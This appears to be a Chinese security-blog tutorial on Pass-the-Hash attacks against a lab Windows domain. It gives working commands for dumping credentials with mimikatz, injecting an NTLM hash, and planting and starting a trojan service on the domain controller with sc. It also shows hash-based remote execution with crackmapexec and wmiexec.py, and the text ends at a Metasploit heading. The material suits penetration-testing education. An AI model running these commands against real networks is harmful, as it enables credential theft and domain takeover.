![maxresdefault](https://image.3001.net/images/20210716/1626405632_60f0fb00531ab6f917ec4.jpg!small)

## 前言

Pass The Hash 即哈希传递攻击，简称 PTH，该攻击方法通过找到与账户相关的密码散列值 NTLM Hash 来进行攻击的。由于在 Windows
系统 NTLM 认证的 TYPE 3 消息计算 Response 的时候，客户端是使用用户的 NTLM Hash
进行计算的，而不是用户密码进行计算的。因此在模拟用户登录或对访问资源的用户进行身份认证的时候，是不需要用户明文密码的，只需要用户 Hash。攻击者可以利用
NTLM HASH 直接远程登录目标主机或反弹 Shell。

在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也相同，攻击者就能使用哈希传递攻击的方法来登录内网中的其他主机。使用该方法，攻击者不需要花费时间来对Hash进行爆破，在内网渗透里非常经典。常常适用于域环境或工作组环境。

## 哈希传递攻击

下面，我们以下图所示的环境来具体演示哈希传递攻击（PTH）的方法。

![image-20210711143331900](https://image.3001.net/images/20210716/1626405632_60f0fb009fb6803a6138d.png!small)

如图中，右侧是一个内网环境，域名为whoamianony.org，有两台主要的机器：域成员主机 Windows 7 和域控制器 Windows Server
2012，其中攻击者已经拿下了内网中的 Windows 7，接下来我们尝试通过哈希传递的方法获取 Windows Server 2012 的控制权。

### 使用 Mimikatz 进行 PTH

下面演示哈希传递攻击的方法（需要管理员权限）：

首先，攻击者在Windows 7上面上传mimikatz，并用mimikatz抓取Hash：

    
    
    privilege::debug  
    sekurlsa::logonpasswords

![image-20210711115055569](https://image.3001.net/images/20210716/1626405632_60f0fb00e67039bb1faa3.png!small)

如上图所示，成功抓取到域管理员的 NTLM Hash 为：ab89b1295e69d353dd7614c7a3a80cec

然后，在 Windows 7 上用 mimikatz 将获取的 Administrator 的 Hash 添加进 lsass 进程中：

    
    
    privilege::debug  
    sekurlsa::pth /user:administrator /domain:whoamianony /ntlm:ab89b1295e69d353dd7614c7a3a80cec

![image-20210711115402017](https://image.3001.net/images/20210716/1626405633_60f0fb012aeb6fb0ae7de.png!small)

成功，此时会自动弹出一个新的cmd窗口，这时访问远程主机或服务，就不用提供明文密码了，如下，我们列出了域控制器 DC 的c盘目录：

![image-20210711115654372](https://image.3001.net/images/20210716/1626405633_60f0fb0164da188847593.png!small)

为了简洁，上述的操作可以用以下一句话命令代替：

    
    
    mimikatz.exe privilege::debug "sekurlsa::pth /domain:whoamianony /user:administrator /ntlm:ab89b1295e69d353dd7614c7a3a80cec /run:cmd.exe" 

此时，为了让域控制器 DC 上线 Metasploit，我们只需做以下工作。

生成一个msf木马shell.exe，将shell.exe上传到Windows 7主机，然后直接使用 copy 命令将shell.exe复制到域控上：

    
    
    copy shell.exe \\DC.whoamianony.org\c$    // 将 shell.exe 复制到域控主机上

![image-20210711123454537](https://image.3001.net/images/20210716/1626405633_60f0fb01ca007c7ecab0e.png!small)

    
    
    sc \\DC.whoamianony.org create backdoor binpath= "c:\shell.exe"    // 在域控上创建服务启动木马  
    sc \\DC.whoamianony.org start backdoor     // 在域控上立即启动该服务  
    sc \\DC.whoamianony.org delete backdoor     // 在域控上立即删除该服务

![image-20210711122041394](https://image.3001.net/images/20210716/1626405634_60f0fb0237fbad87f64d7.png!small)

此时虽然显示 1053 错误，但是如下图所示，域控制器成功上线，并且还是 SYSTEM 权限：

![image-20210711123142055](https://image.3001.net/images/20210716/1626405634_60f0fb027e505437dfc74.png!small)

注意，哈希传递攻击要注意一下几点：

> dir命令后面要使用主机名，不能用 IP，否则报错
>
> 使用 mimikatz 进行哈希传递要具有本地管理员权限

### 使用 Crackmapexec 进行 PTH

该工具位于kali上面，其可以对C段主机批量进行PTH攻击。

下载地址：<https://github.com/byt3bl33d3r/CrackMapExec.git>

在kali上直接用apt-get就可以安装：

    
    
    apt-get install crackmapexec

对内网主机进行PTH的命令如下：

    
    
    crackmapexec smb 192.168.93.30 -u administrator -H ab89b1295e69d353dd7614c7a3a80cec -d whoamianony.org -x whoami  
    crackmapexec smb 192.168.93.30 -u administrator -H ab89b1295e69d353dd7614c7a3a80cec -d whoamianony.org -x ipconfig

>  **IP：** 可以是单个IP也可以是IP段
>
>  **-u：** 指定用户名
>
>  **-H：** 指定NTLM Hash
>
>  **-d：** 指定域
>
>  **-x：** 执行系统命令

如下图所示，成功在 DC 主机上执行命令：

![image-20210711123730400](https://image.3001.net/images/20210716/1626405636_60f0fb04af5b059c3bdd2.png!small)

![image-20210711123841440](https://image.3001.net/images/20210716/1626405637_60f0fb05e1b43c61eea82.png!small)

### 利用 wmiexec 进行 PTH

> 项目地址：<https://github.com/SecureAuthCorp/impacket>

这是 impacket 工具包里面的一个脚本，可以用来 PTH，同时可以走 socks4/5 代理，十分强大。

首先在攻击机上安装 Impacket 工具包：

    
    
    git clone https://github.com/CoreSecurity/impacket.git  
    cd impacket/  
    pip install .

进入 examples 目录即可找到我们的 wmiexec.py，然后执行以下命令即可：

    
    
    python wmiexec.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec whoamianony/administrator@192.168.93.129 "whoami"  
    # (proxychains4) python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@IP "命令"

### 使用 Metasploit 进行 PTH

经常使用的三个模块：

